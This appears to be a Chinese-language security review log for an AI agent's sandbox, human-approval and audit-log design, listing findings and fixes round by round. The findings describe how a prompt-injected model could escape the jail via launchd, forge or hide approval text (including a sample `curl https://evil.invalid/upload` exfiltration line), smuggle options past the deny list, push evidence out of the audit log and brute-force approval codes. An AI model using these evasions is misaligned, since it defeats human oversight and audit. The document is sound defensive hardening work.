| S1 | 高 | **首轮的藏法把工作区自己也藏了**：`hiddenPaths` 与再放开的根按「种类」分组发，藏的那组落在放开之后，两个执行器（SBPL 末条胜、bwrap 后挂盖前挂）都按**顺序**裁决 ⇒ 藏 HOME 会连同 HOME 下的工作区/node 前缀一起盖掉，手直接瘫；反过来把藏的提前又会让 HOME 整个敞开 | core 新 `planJailLayers`：按**路径深度排序、深的后发**（同深按 只读<读写<藏 排），于是「藏 HOME → 放开工作区 → 藏工作区里的点名文件」三层交替能表达；已经落在某条**更浅（或同深）的藏**里、且两者之间没有再放开的藏条目是多余的，剪掉（`isSwallowedByHidden`：有更深的再放开插在中间就**不**剪——那条藏正是要把再放开的东西重新盖回去的）；`hardening` 缺席时逐字节走老路径 |
| S2 | 高 | macOS 侧没拦 launchd：`launchctl submit` 能把活儿甩到监狱外 | `(deny job-creation)`（真机探针：macOS 26 的 launchd 本就拒绝沙箱内客户端建 job，这是第二把锁）；Mach/XPC 未逐服务收窄 = 开发机残余（§10.4） |
| S3 | 中 | 文档说 macOS 分离守护「活到下一条命令」——不对 | 改口：`setsid()` 的孙进程**一直活着**，试过的清扫办法都不成立（§10.4） |
| S4 | 中 | 审批标题截到 120 字符且不说截了多少：`sh -c` 的真动作常在 120 字之后 ⇒ 人批的是省略号 | 命令 600 / stdin 240，截断处附「共 N 字符，已截断，完整命令见审计台账」，并把 **cwd** 写进标题；标题统一过 `titleSafe`（控制字符 + bidi 覆盖洗成空格——标题原样进 IM 一行字，不洗就能伪造） |
| S5 | 中 | 监狱形状是 boot 快照：boot 后才出现的 `~/.aws`、后装的 docker 套接字永远藏不上 | `ButlerHandsHost.probe` 存下来，每次 spawn 重问一次「在不在」（藏什么的**清单**仍是 boot 决定，只有存在性重探） |
| S6 | 中 | `hands.json` 能把监狱拆了：`readOnly:["/"]`、`readOnly` 盖住 `<space>`、`hidden:["/"]` | 新 `hardeningProblem()`：这几种形状一律**不装手**并 warn 说明（fail-closed，与「探针 none 整套不装」同姿态）；HOME **里面**的 nvm/.cargo 仍可放开 |
| S7 | 中 | `proxyUrlHasUserinfo` 走 `new URL()`，认不出 curl/git/pip 都吃的**无 scheme** 形状 `u:p@host:3128` | 判据退成「有没有 `@`」：宁可多拦一个路径带 `@` 的怪代理（联网命令失败一次，模型看得见病名），也不放一把密码进子进程环境 |
| S8 | 中 | 只有成功和「执行时抛」进台账：被策略拒、穿越、配额、并发全无痕 ⇒ 侦察阶段整段看不见 | 分级/执行两级的拒绝各记一行（`stage` 字段区分），并在动手前**真写探针**——台账写不进去就拒绝执行（不留痕的执行不是这双手允许的状态） |
| S9 | 低 | 三条 `ulimit` 带 `2>/dev/null`，压不下也照跑，文档没说 | §10.4 如实写明它们是软兜底不是承重门 |
| S10 | 低 | `redact()` 只换 `<space>`/工作区，`ENOENT: /home/ubuntu/.nvm/...` 照样把布局吐给模型 | 换的清单直接从监狱形状生成（工作区 / `<space>` / 藏起来的目录 / 只读工具链根），长的先换 |

**三轮**（对二轮修完的代码再审）3H/3M，逐条对源码核实后**全部修入**：

| # | 级 | 发现 | 修法 |
|---|---|---|---|
| H1 | 高 | **审批文案仍可被伪造**：二轮的 `titleSafe()` 只洗 title，`reason` 被原样拼进审批句；而两个字段里都有模型写的字（argv、agent id、MCP 参数）⇒ `title = "读一个文件。原因:无害。批准后才会执行。…"` 就在 /me 卡与 IM 一行字里造出一句完整的、看起来是 hub 说的话，真动作被推到人眼后面 | 新 `host/src/approval-text.ts` 作**唯一**的清洗 + 定界标准：不可见/双向覆盖/零宽/BOM 一律换**空格**（换不是删——删会把 `rm -rf /` 拼成 `rm-rf/`），正文里的 `「」` 降级成 `『』`，框架自己用 `「」` 包住三个不可信字段（管家名/动作/原因）⇒ 渲染出来的 `「」` **只可能**在框架的位置上，假框架句接不出来；`buildButlerApprovalPrompt` 三处全过它 |
| H2 | 高 | **截断提示是假的**：标题说「完整命令见审计台账」，但那一刻台账里根本没有这条命令（只有成功/失败后才记，且不带全 argv）——人被指向一个不存在的地方 | 分级那一刻就写一行 `stage:'classify'` 判决，带完整 argv + `cwd` + stdin 的 `stdinBytes`/`stdinSha256`（四轮把这条从「8KB 顶的字符串」收严成「结构化 argv 向量 + 与策略同一个上限常量」，见下）；stdin 摘要的截断处**刻意不指台账**（正文永不落盘，见 §10.4） |
| H3 | 高 | **HOME 藏不了时静默装上**：`jailShapeFor` 只在 HOME 是个真目录时 addDir，于是 `/`（服务账号）或 boot 时还不存在（容器后建家目录、账号切换）都被**静默跳过**，hub 用户的家目录连同里面的 `gotong.env` 一起留在监狱里可读，日志一个字不少 | ①`hardeningProblem()` 补一条：HOME 解析成 `/` 或空 ⇒ 与「`<space>` 是 `/`」同罪，**不装手** + warn；②每次 spawn 的 `hardening()` 把 `probe.homedir()` 也重问一遍（S5 只重探了两张常量表，而 HOME 不在表里 ⇒ 只补常量表 = 永远补不回它） |
| M4 | 中 | **选项穿透**：执行器跑 `sh -c '…' "$0" "$@"`，argv[0] 落在 `$0` 上，`hands_run(["-c","curl …"])` 于是变成第二层 `sh -c`——而拒绝表与联网推断查的都是 argv[0] 那个「命令名」，全被绕过 | 策略层拒绝 argv[0] 以 `-` 开头（`run_invalid`）。**刻意不用 Codex 建议的 `exec -- "$0"`**：实测 `/bin/dash -c 'exec -- "$0" …'` 报 `exec: --: not found` rc=127，而 Linux 的 `/bin/sh` 通常正是 dash ⇒ 那样修会把整条 Linux 路径打死（本条已回报 Codex） |
| M5 | 中 | **写得进去的证据是假的**：`auditProblem()` 用零字节 `appendFileSync(p,'')` 探针，它证明的是「那一刻能打开」，不是「这一行落了盘」；只读文件系统上甚至不一定失败 | 探针整个删掉，改成动手前真落一行 `stage:'begin'`——**写成了才动手**，写不成 `refuse`/`isError` 并说「审计台账写不进去」。它同时是崩溃/断电时唯一的线索：只有 `begin` 没有结果的那一行，说的正是「开始了，没回来」 |
| M6 | 中 | **早退的失败一个字不留**：四个文件动作只在成功那条路上记账，「不是目录」「不存在」「监狱不让」「内容太大」全无痕 | 不在七八处早退各补一行（下一个早退又会漏），而在动作回来那一刻**数**：这一趟一行都没记 → 补一行兜底。台账的合同是「每次动手都有痕」，不是「每处记得写」 |

三轮的六条各配一道会红的门，六次变异测试逐条按预期变红后复原 byte-identical（H1 去掉定界 ⇒ 4 例红；
M4 去掉守卫 ⇒ 1 例红；H3a 去掉 HOME 判死 ⇒ arm 门红；H3b 去掉每次 spawn 重问 HOME ⇒ **真 spawn 门里
`.netrc` 的密码当场泄出来**；M6 去掉计数兜底 ⇒ 早退失败无痕）。

**四轮**（对三轮修完的代码再审）3H/3M，逐条对源码核实后**全部修入**：

| # | 级 | 发现 | 修法 |
|---|---|---|---|
| H1 | 高 | **盲签**：IM 的 `/inbox` 一行只渲染 `item.title`，而 park 出来的 item 用的是**任务**的 title——生产 IM 任务的 title 是传输标签 `im:lark`。手机上批的人于是看到「im:lark」四个字就要按批准，动作本身一个字都没有 | 行标题改取**被批动作自己的**标题（它已过同一套清洗+定界），`task.title` 不再有资格代表动作。**这一轮只改到了管家与 ACP 两处**：steward 与联邦出站当时仍在写 `task.title`（那也是传输标签），五轮 L 才补完——见下 |
| H2 | 高 | **「完整命令见审计台账」仍可能落空**：三轮把 argv 记进 `classify` 行，但那是个 8KB 顶的**拼接字符串**——策略允许的命令可以比它长（于是被截，指路又成空头支票），且 `['printf','a b']` 与 `['printf','a','b']` 拼出来一模一样（台账认不出真跑的是哪条） | 两刀：①策略层新增 argv **总量顶** `maxArgvTotalChars`（16KB），超了当场拒并指「写成脚本文件再跑」；②台账改记**结构化 argv 向量**，容量常量直接取策略那个顶（`AUDIT_ARGV_CHARS = HANDS_LIMITS.maxArgvTotalChars`）⇒「可批准的命令」≡「可留档的命令」，截断分支自此结构上到不了（留着是防御性的），门于是钉**上限那一点**：最大的那条可批准命令原样进台账、零截断标记 |
| H3 | 高 | **审批文案的标准只有管家一处在用**：三轮的 `approval-text.ts` 是为管家写的，而 hub 里还有三处自己拼审批句——ACP 破坏性动作（`tool.title` 由**对端 coding agent** 送来，比管家的字段更不可信）、steward 配置动作、联邦出站 | 四个入口全部改走同一个 `approval-text.ts`；新增 `approval-copy-shared.test.ts` + ACP 侧断言，把「全仓只有一处答案」这句声称本身变成会红的门（洗完的句子里框架定界符 `「」` 只可能出现在框架自己的位置上） |
| M4 | 中 | **兜底记账问错了问题**：`recorded` 是 toolset 作用域的计数器，答的是「有没有人记过」，要问的是「**我这一趟**记过没有」。同一成员两次调用并发到同一份 toolset 时，第二次被 `BUSY` 拒——**而那次拒绝也写一行**——于是第一趟早退回来时看到「记过了」，把自己那条失败漏掉 | `AsyncLocalStorage` 让这格状态跟着调用走，整个 `execute` 跑在它的作用域里；并发的另一趟拿的是另一格 |
| M5 | 中 | **HOME 判死只判了 boot 那一刻**：三轮 H3b 每次 spawn 重问 HOME，但只用它去 addDir——重问的**意义**就在于它会变，变成 `/`/空/相对路径时那个循环静默跳过，命令照跑而家目录没藏（正是 arm 时判死要避免的状态，只是晚了一步发生） | 每次 spawn 前用**与 arm 时逐字相同的三个条件**现判死，不合格当场抛（这一趟仍留痕：`begin` 一行 + 兜底一行）；顺手把 arm 侧也补上「相对路径同罪」——否则两处在判同一件事却判得不一样 |
| M6 | 中 | **定界符只挡了一种写法**：`「」` 有 NFKC 等价的相似字（半角 `｢｣`、竖排 `﹁﹂`），拿它们照样拼得出「看起来是框架说的」话；且清洗按 UTF-16 码元遍历，增补平面的标签字符（U+E0000–E007F，整段隐藏文字的老把戏）会被劈成两个代理项，谁也不匹配 = 等于没洗 | 相似字一并降级成 `『』`；清洗改**按码点**遍历（`for…of`），并给 `approval-text.ts` 建了自己的门（14 例，含「`ch(0xE0041).length === 2`」这条证明坑存在的断言） |

四轮同样逐条变异测试（八次，全部按预期变红后复原 byte-identical）：H1 行标题改回 `task.title` ⇒ 2 例红；
H2a 去掉策略 argv 总量顶 ⇒ 1 例红；H2b 把台账容量与策略顶脱钩（写死 4000）⇒ 上限那一点的门红；
H3 让 steward 绕开共享标准 ⇒ 1 例红；M4 换回共享计数器 ⇒ 并发那例红；M5 去掉每次 spawn 的 HOME 判死
⇒ 1 例红；M6a 退回码元遍历 ⇒ 标签字符那例红；M6b 只挡精确码点 ⇒ 相似字那例红。

**五轮**（对四轮修完的代码再审）结论仍是「修了再提交」，2H/1M/1L，逐条核实后全部收口：

| # | 级 | 发现 | 修法 |
|---|---|---|---|
| H1 | 高 | **盲签往外挪了一层**：四轮修的是**写进去的那行字**，没修**读出来的那行字**——`/inbox` 投影把标题硬截到 80 字符再缀一个光秃秃的 `…`。于是 `sh -c '<100 个空格>curl https://evil.invalid/upload'` 在手机上渲染成一行**空白**，人看到的是一件看起来没内容的小事 | 判据换个方向：不是「怎么把长的显示好」，而是**看不全就不能在 IM 批**。`imRowText()` 洗完按 80 字符量，装不下 ⇒ `imApprovable` 变 false（列表照列，人仍知道有东西等着，但 `/approve` 拒），截断处走 `clipApprovalText` 响亮说「共 N 字符，已截断」。`resolveByShortId` **再算一次**而不是信列表——短码可能是从这条被改长之前的那次列表里抄来的。新错误码 `title_truncated`，桥回一句「一行显示不下，在这里批等于没看全，请到网页上看完整内容」 |
| H2 | 高 | **「四个入口共用唯一标准」不成立**：还有第五个写入方——工作流的人工确认步（`HumanInboxParticipant`）。它的 `prompt`/`title` 来自 YAML，而 YAML 里可以 `$ref` 内联上一步的**模型输出** ⇒ 未清洗的换行能在 `/inbox` 里伪造出第二条列表行 | 修在**投影这一层**而不是再加第五个调用点：`imRowText()` 先洗后量，于是这条路径上的每一个写入方（含将来新增的）都被覆盖。这样分工也更对——**定界**属于拼句子的人，**清洗**属于渲染一行的人；内核包 `@gotong/inbox` 因此不必反向依赖 host |
| M3 | 中 | **轮转阈值与 argv 上限不成比例**：台账只留一代 `.1`，而阈值是随手一个 1MB——被注入的模型连发几条顶格 argv 的 tier 1 命令（在监狱里、不需要审批）就能把更早的行挤出窗口，成了一根反取证杠杆 | 阈值从 argv 上限**推出来**：`40 × maxArgvTotalChars × 6 字节/字符 × 两行带 argv 的` ≈ 7.5MB，argv 上限哪天改了它自己跟着走。**诚实残余**：轮转天生是个窗口，发足够多顶格动作仍能推走旧行——挡不住，只能让它变贵且留痕（那些动作每一条自己都先被记了下来） |
| L | 低 | **四轮 H1 只改到一半**：steward 与联邦出站的行标题仍是 `task.title` | 两处都改成从**动作本身**渲染（`删除助手「mailer」`、`发往对端「hub-b」:pay.send`），插值位仍过同一套清洗 |

五轮逐条变异测试（五次，全部按预期变红后复原 byte-identical）：H1a 去掉 `row.complete` ⇒ 截断那例红；
H1b 关掉 resolve 侧完整性门 ⇒ 拒批那例红；H2 让 `imRowText` 不洗 ⇒ 2 例红；L 两处行标题各自改回
`task.title` ⇒ 各 1 例红；M3 换回写死的 1MB ⇒ 轮转那例红。**M3 那次变异第一遍没红**——测试只证了「超过阈值
会轮转」，而 1MB 同样会轮转；补上「差一个字节到阈值就**不**该轮转」这半边才真的钉住了阈值本身。
变异测试自己也要被验证：它没变红时，先怀疑门而不是怀疑变异。

**六轮**（对五轮修完的代码再审）结论仍是「修了再提交」，2H/2M/1L；`steward`/联邦出站的动作标签本轮
没有再漏分支。逐条对源码核实后全部收口：

| # | 级 | 发现 | 修法 |
|---|---|---|---|
| H1 | 高 | **短码是槽位号不是内容**：收件箱按 `itemId = task.id` 寻址，而**同一个任务会在同一个 id 下反复 park**（管家 tool-loop 批一个跑一个，`FileInboxStore.write` 直接覆盖）。于是聊天记录里往上翻一条旧 `/inbox` 抄下来的短码今天仍然匹配得上——人以为在批「读一个文件」，批下去的是后来写进去的「往外发」 | 短码改成**内容指纹**：`imShortId()` = sha256(itemId ‖ createdAt ‖ title ‖ prompt) 前 8 位，各段带长度前缀（不用分隔符 ⇒ 不存在「把分隔符写进标题里凑出另一段组合」）。动作一变短码就变，旧短码落 `not_found`（桥回「可能已被处理，发 /inbox 看最新列表」）；同一件事没变过 ⇒ 短码稳定，抄下来照样能用 |
| H2 | 高 | **标题把正文藏起来**：`imApprovable` 是**写入时**的断言「这一行字就是全部内容」，但 `HumanInboxParticipant` 无条件标它。IM 一行渲染的是 `title ?? prompt`，网页两样都显示 ⇒ `title: 排班确认` + `prompt: <整张排班表>` 在手机上读到的只有四个字。**仓里两个画廊模板正好是这个形状**（`cafe-ops` / `pro-firm-hub`） | 写入侧收窄成**「给了标题就只能在网页上批」**（`payload.title === undefined` 才标）——steward / 联邦出站 / 管家的标题是从动作**算**出来的、与正文同信息量，不受影响；投影侧再兜一道：洗完是空白（`title` 写成一个零宽字符）同样降级网页，行文本换成「(这条没有可显示的内容)」。空白永远不是一个完整的故事 |
| M3 | 中 | **轮转阈值算少了、而且那道门永远绿**：一次 `hands_run` 落的是 **三** 行带 argv 的记录（`begin`/`approved`/`end`）不是两行，故五轮那个 ≈7.5MB 实际只装得下 ~26 条而不是 40 条；更糟的是门**照抄了同一个公式**，只能证明「我算得和它一样」 | 常量按三行重算（`AUDIT_MIN_ACTIONS × 每条 3 行 ≈ 12MB`），门改成**量出来的**：真跑一条顶格 argv 的动作、`statSync` 量它涨了多少字节，再断言阈值除以实测值 ≥ 40。**排错记**：第一版用控制字符填 argv 只落了 1 行——`hasHostileArgChar` 在策略层就把它拒了（`run_invalid`），真正的 6 字节/码元最坏情况是**孤立代理项**（控制字符结构性到不了台账）。另记两条诚实残余：轮转天生是窗口；台账在工作区配额之外，最坏 ≈25MB × 成员数，无 hub 级总量顶 |
| L | 低 | **截断能劈开一个字**：`clipApprovalText` 按 UTF-16 码元 `slice`，把增补平面的字（emoji 等）切成半个代理项，渲染出来多一个原文里没有的替换符——而这行字的全部意义就是「它和真正要跑的动作是同一件事」 | 按**码点**切（`Array.from`），「共 N 字符」也随之按码点数（20 个 emoji 是 20 不是 40） |

六轮同样逐条变异测试（四次，全部按预期变红后复原 byte-identical）：H1 短码退回 `itemId` 前缀 ⇒ 旧短码
那例红（而且红得很准：`promise resolved "{ title: '往外发一封邮件' }" instead of rejecting`——正是那个洞
本身）；H2 写入侧改回无条件标 ⇒ 带标题那例红；H2b 去掉「洗完空白」判据 ⇒ 零宽标题那例红；L 退回按码元
切 ⇒ 孤立代理项那例红。

**七轮**（对六轮修完的代码再审）2H/2M/3L。这一轮有两条是**六轮的修法自己带出来的**（M3 是它误伤了
别人，M4 是它让一个下限失去了意义），另有一条 L 是六轮那一刀只砍了两处同型代码中的一处。逐条对源码
核实后全部收口：

| # | 级 | 发现 | 修法 |
|---|---|---|---|
| H1 | 高 | **六轮的指纹只挡住了「抄旧短码」，没挡住「批准飞行中被掉包」**：`resolveByShortId` 重算一次指纹确认这仍是那个动作，然后才调 `markResolved` —— 两步之间同一个 id 可以被重新 park 成另一个动作。store 那道 pending-only 闸看不见这次掉包（新一代同样是 `pending`），于是人批的是 A、落笔的是 B。**id 不是代际** | 把「我在批的是哪一代」作为**谓词**一路传到 store：新 `InboxExpectation`（`InboxStore.markResolved` 第四参，additive 可选），在 `resolveLocked` 里**紧挨着写之前、且在同一把 per-item 锁内**求值，不符 ⇒ 新错误码 `stale_item`，一个字节都不写。IM 侧传的谓词就是「重算的指纹还等于人打的那串码」。**放在调用方检查是治不好的**——窗口正是在调用方检查之后 |
| H2 | 高 | **「洗完是空白」的判据是反着写的**：六轮 H2b 问的是「洗完还剩不剩字符」，那是拿黑名单当全集。渲染成空白但**不在**名单里的字符照样答「有内容」 | 判据换成白名单：`hasVisibleContent()` 要求至少有一个字母/数字/标点/符号。**顺序在这里承重**——白名单自己也会被骗（U+2800 盲文空模的分类是**符号**、U+3164 谚文填充是**字母**，两者屏幕上都是空白），所以必须**先洗后问**：名单先把它们换成空格，白名单再问洗完还剩什么。同轮补齐名单：U+2800、落单代理项、U+FFF9–FFFB 行间注释、U+2060–206F 合并成整段 |
| M3 | 中 | **六轮 H2 的收窄误伤了正主**：它把「写了 `title` 就只能在网页上批」当成修法，可标题在场 ≠ 正文被藏起来。仓里 **21 条**画廊 human 步本来短小、本来该能在手机上批，被这一刀一起关进网页 | 收窄整个撤掉，改在**渲染层**做诚实的事：`imRowText` 把 `title` 与 `prompt` **两段一起**渲染再按一行预算量——藏正文的那种形状（短标题 + 一整张表）自然超预算落 `title_truncated`，短小的那 21 条照旧能在手机上批。**一处刻意**：正文里已经含标题就不重复拼（管家 park 的 prompt 本就把标题逐字嵌在里面，拼一遍会平白多出 5 个字符把 80 的预算顶爆，让**每一条**管家 governed park 都变成网页 only） |
| M4 | 中 | **下限还停在「至少 4 位」**：短码在六轮已经从 id 前缀变成内容指纹，而指纹抄一半不是任何东西的名字——4 位只有 16 bit，同一个人手上几件待办撞一次的概率并不小，撞了还只能拒 | `MIN_SHORT_ID` 抬到全长（8 位十六进制）。这同时是**一致性**要求而不只是加固：H1 的谓词比的是**完整**指纹，4 位的码永远等不上，每一次短码审批都会落 `stale_item`。下限等于全长后前缀匹配退化成相等，`ambiguous` 只在真的 32 bit 撞车时才可能出现（门里用确定性生日搜索造了一对真撞的 `createdAt`） |
| L5 | 低 | `im-adapter` 的注释还写着「`/approve` 作用在 itemId 前缀上」——六轮之后这句话不再是真的，而这是内核包里给下一个人看的说明 | 改成「短码对本解析器不透明；host 侧定义它是内容指纹，不是 itemId 前缀」 |
| L6 | 低 | **六轮那刀只砍了两处同型代码的一处**：`clipApprovalText` 改按码点切了，`personal-butler-hands.ts` 里自己那份 `clipSafe`（审批标题的 argv/stdin 摘要走它）还在按码元 `slice` | 同改按码点；「共 N 字符」也随之按码点数（门：700 个 emoji 报 706 不报 1406，且输出里零个落单代理项） |
| L7 | 低 | 六轮 M3 的散文把**行数**当成了**动作数**：≈12MB ÷ 每行 300 字节 ≈ 四万，但一条动作记三行 | 散文改成「约一万四千条正常动作」（顶格 argv 的仍是 40 条那一档，那一档由实测门钉着） |

七轮逐条变异测试（五次，全部按预期变红后复原 byte-identical）：H1a 摘掉 store 里的代际闸 ⇒ inbox 两例 +
e2e 幕四同时红；H1b 让 host 侧不再把谓词传下去 ⇒ e2e 幕四红（证明这条缝是端到端接通的，不是只在 store
里自娱自乐）；H2 从名单里去掉 U+2800 ⇒ 3 例红（跨 `approval-text` 与 `im-approval-service` 两层）；M3 把行
渲染改回只有标题 ⇒ 6 例红；M4 下限退回 4 ⇒ 1 例红；L6 `clipSafe` 退回按码元切 ⇒ 码点那例红。

**这一轮自己踩的两个坑，记下来**：①M3 的第一版把 `title · prompt` 无条件拼起来，管家 park 当场超预算
——**审批句里 prompt 才是权威字段，title 只是它的标签**，`buildButlerApprovalPrompt` 早就把标题逐字
嵌在正文里了。加个「正文已含标题就不拼」的判断之前，e2e 幕二直接变红，是它先说出了这件事。
②H2 的门第一版断言 `hasVisibleContent(sneaky) === false` —— 断言写错了，代码是对的：U+2800/U+3164 在
Unicode 里确实是符号与字母。改成断言那条**更强**的真话（白名单自己会被骗、先洗后问才拦得住），门反而
更有牙了。**门变红时先确认自己断言的是不是真话**，这次是断言错了，六轮 M3 那次是门不够严——两种都发生过。

**八轮**（对七轮修完的代码再审）3H/2M/3L。这一轮的三条 HIGH 有个共同形状：**七轮把闸修好了，但闸两侧
各自还有一条路能绕过去**——锁只盖住读者、代际闸守的东西自己会被换、归属检查读的是锁外的快照。逐条对
源码核实后全部收口（其中 M2 我判得比 Codex 更重，理由见下）：

| # | 级 | 发现 | 修法 |
|---|---|---|---|
| H1a | 高 | **只锁读者、不锁写者的锁不是锁**：`FileInboxStore` 的 per-item 锁包住了 `markResolved`/`delegate`，唯独没包 `write()`。`resolveLocked` 是「读 → 查代际 → **await** 写」，一次并发的重新 park 落在那个 await 里，既不排在它后面、也不在它的视野里——代际闸在它读到的那一代上通过，盘上最后一次 rename 却是另一代 | `write()` 走同一个 `serialize()`；真正的落盘抽成 `writeLocked()` 供持锁的路径调用（否则自锁）。门量的是**顺序**不是内容：持锁期间发起的 write，40ms 内一个字节都不落 |
| H1b | 高 | **代际闸守的东西自己会被换掉**：`resumeChild` 在提交**之后**按裸 `itemId` 重新查一次挂起行，而 `main.ts` 的 suspendNotifier **先**写 `suspended_tasks`、**后**写待批项——两次写之间的那条缝里，闸验的是第 N 代的待批项，resume 的是第 N+1 代的任务。闸再严，只要它守的东西是事后重新查的，它就什么也没守 | 挂起行的快照与待批项**在同一刻**取（`validateDecision` 之后立刻 `getSuspendedTask`），作为参数交给 `resumeChild`。于是后来的重新 park 是**被忽略**，而不是被默默照办 |
| H2 | 高 | **锁外读的快照上做的检查不是授权**：`delegate` 自己单独拿锁，改的是 `userId`，item 仍 `pending`，指纹涉及的四个字段一个没动。于是 Alice 可以在自己还拥有它的时候通过归属检查、在提交那一刻它已经是 Bob 的了，决定照样落上去 | 归属与 `kind` 一起钉进交给 store 的谓词：`fresh.userId === userId && fresh.kind === item.kind && (调用方谓词)`。三件事同在一把锁内、同在写之前求值 |
| H3 | 高 | **空白字形是点不完的**：七轮把判据写成「字母/数字/标点/符号」，于是拉黑 U+2800 之后还有 U+1D159（MUSICAL SYMBOL NULL NOTEHEAD，同样是 So、同样不占一撇，而且在增补平面）。这类字形有几百个 | 判据收窄成 `\p{L}\p{N}`——**必须有字或数**。整个「渲染成空白的标点/符号」类别一次性关掉，代价只是「一行纯标点」也算读不全（降级去网页，方向是对的）。先洗后问的顺序仍然承重：U+3164 分类是**字母**，白名单单独看它会被骗 |
| M1 | 中（按高改） | **去重判据是攻击者两头都能写的子串关系**：`body.includes(title)` ⇒ `title:'删除生产数据库'` 配 `prompt:'不要删除生产数据库；这里只批准查看健康状态'`，标题被它自己藏掉，人读到的只剩正文 | 锚在**框架的定界符**上：找 `「<title>」`。写入方已经把不可信文本里的 `「」` 降级成 `『』`，所以正文里的框架定界符只可能是框架自己放的。**顺序承重**：锚点必须在**洗之前**看，因为渲染前的这次清洗会把框架那对也降级掉。另留一条同样不可伪造的捷径：正文与标题**完全相同**时说一遍即可 |
| M2 | 中（我判为高） | **短码只有 32 bit 且不带密钥**，任何人都能自己算 | 换 HMAC-SHA256，密钥 32 字节存 `<space>/runtime/im-shortcode.key`（0600，缺了就生成、短了就抛、**没有静默回落**——回落成不带密钥的摘要与「这道防线还在」从外面看一模一样）。**为什么我判得比 Codex 重**：HANDS-M2 之后阿同**有手**——tier 1 命令免审批、在监狱里就能跑一个磨哈希的脚本；它还知道自己那次 park 的 title/prompt，`createdAt` 就在它调用工具的几十毫秒内。于是「磨一个新动作，让它的指纹撞上人手里那串旧码」把 H1 那道代际闸整个绕过去，成本是 ~2²⁵ 量级的多目标原像。带了密钥它连算都算不出来，这条路结构性关掉 |
| L1 | 低 | **一行读不读得全，两处用了两把尺**：完整性判据按 `.length`（UTF-16 码元）量，`clipApprovalText` 按码点切。41 个增补平面汉字 = 41 码点 / 82 码元 ⇒ 列表显示得好好的、没有截断标记，`/approve` 却报「太长」 | 完整性也按码点量 |
| L2 | 低 | **锁按原始 id 分桶，而 `sanitiseItemId` 不是单射**：`a:b` 与 `a__b` 是同一个文件，却会被当成两件事并发跑 | 锁按**清洗后的文件名**分桶——锁要保护的是那个文件 |
| L3 | 低 | `im-adapter/types.ts` 与 `IM-APPROVAL.md` 里还写着「itemId 前缀 / 前缀匹配」 | 两处改口：短码是**完整 8 位内容指纹**，不是 id 前缀 |

八轮逐条变异测试（五次，全部按预期变红后复原 byte-identical）：H1a 让 `write()` 绕过锁 ⇒ 顺序那两例红；
L2 锁改回按原始 id ⇒ 同文件那例红（H1 那例仍绿，证明两条门各管各的）；H1b 让 `resumeChild` 重新查一次
挂起行 ⇒ 快照那例红；H2 从谓词里去掉 `userId`/`kind` ⇒ 转派那例红；H3 判据放回 L/N/P/S ⇒ 空白字形那例红；
M1 退回裸子串 ⇒ 否定攻击 + 伪造锚点两例红；M2 换成不带密钥的摘要 ⇒ 换钥匙那例红；L1 退回按码元量 ⇒
41 字那例红。

**这一轮自己踩的坑**：H1b 的第一版变异测试**红得太多**——8 例全红，报的是 `Assignment to constant
variable`。原因是我用来定位的那句 `if (!row || row.corrupt) {` 在 `resumeChild` 与 `resumeParent` 里**各有
一份**，变异同时打进了两处，而后者的 `row` 是 `const`。**变异测试自己也要验证它真的只改了想改的那处**：
换成唯一锚点重做，恰好一例红、且是该红的那例。这是同一条教训第三次出现（六轮：门不够严；七轮：断言写错；
八轮：变异打歪）——门变红或不红，先问「红的是不是我想验的那件事」。

### 10.6 Codex 交叉审账（九轮）

**九轮**（对八轮修完的代码再审）3H/5M/6L。这一轮的两条 HIGH **是 HANDS-M2 这刀自己带出来的**，
而它们带出来的方式值得单独记：不是写错了一行，是**挂上了一族新工具，而一道既有的门是按名字形状
写的**——门没变，被门管的东西变了。

| # | 级 | 发现 | 修法 |
|---|---|---|---|
| H1a | 高 | **`imApprovable` 名义上是白名单、实现是排除法**：判据是「不是 `ask_peer`、名字里没有 `__`」。于是 HANDS-M2 一次挂上的五件 `hands_*` 一个字没改就全部落进了「手机上可以批」的一侧——**没有人做过这个决定**。`pack_backup` 同罪（身份档里有 hub 签名钥，AFR-M7 自己写着是凭证级动作） | 改成列举 `IM_APPROVABLE_TOOLS`（五件 hub 内配置动作），新工具的默认答案是「不在名单上」。`butler-tool-tiers.test.ts` 做双向核对：每个 governed 工具必须恰好落在「IM 可批」或「网页 only」一侧，新增一个而两边都不表态就红 |
| H1b | 高 | **一个 run 的两个人步并行批，父 run 被 resume 两次**：子任务那边是护住的（一件事一把 per-item 锁 + pending-only 闸），父任务没有——两个 item 指向**同一行**挂起记录，两名成员同一秒各批各的，双双通过全部检查、双双 `resumeTask` | resume 挪到 `claimSuspendedTask` 这把 CAS 后面，与 resume 巡检用同一把闸，两条路互斥。失败路径**刻意不 release**：claim 之后死掉的调用方由 `reclaimStaleSuspendedClaims` 回收，再加一个 release 等于写第二份更弱的同一机制 |
| H2 | 高 | **标题去重的判据可被伪造**：八轮把它锚在框架定界符 `「title」` 上，前提是「不可信文本里的 `「」` 已被降级」——那对**管家写入方**成立，且只对它成立（`HumanInboxParticipant` 逐字节存 prompt/title，工作流 human 步的 prompt 还能 `$ref` 内联模型输出）。于是正文里写一对真的 `「标题」` 就能把**人写的标题**从这行字里抹掉 | 写入方结构性声明 `titleInPrompt`（additive 可选，unset = 不表态 = 两段都渲染，**永远不反过来解释**）。渲染层不该从文本里倒推写入方笃定知道的事 |
| M1 | 中 | **代际闸只罩住了 resolve，没罩住 delegate**：转派同样是「关于一个具体动作的决定」，而 pending-only 判据看不见掉包。Alice 读到「读一个文件」，管家在同一 id 下重新 park 成「往外发」，她按下转派，落到 Bob 手上的是她从没看见过的那一件、署的是她的名 | `InboxStore.delegate` 加可选 `expect`，在 `delegateLocked` 里紧挨着写之前、同一把锁内求值。host 侧钉的字段 = 归属 + 短码指纹涉及的那四个，**两条路对「同一件事」的定义因此一致** |
| M2 | 中 | **resume 没跑成，人什么也不知道**：`resumeChild` 在挂起行不见了 / `task_json` 坏掉时返回 null——决定已落盘、审计也写了，然后什么都没跑；而回执把这个 null 和「重新 park」那个 null 一视同仁地沉默掉了 | **两个 null 不是同一个 null**：重新 park 是「还没落定，下次 resolve 会落定」，该沉默；这个是「不会有下次了」，必须说 |
| M3 | 中 | **IM 短码 HMAC 钥躺在全量档里**：全量档默认不带主钥，整个设计前提是「拿到包也打不开金库」；而这一把是明文裸密钥，拿到就能离线磨短码碰撞（八轮 M2 关掉的正是这条路） | 与会话文件同一档：永远排除、没有开关、`--include-master-key` 也不放行（那个旗标是给主钥的，不是「凡密钥皆装上」）。代价是恢复进新家后旧短码不再匹配——**而那恰好是对的**，短码指的是当时那些待批项 |
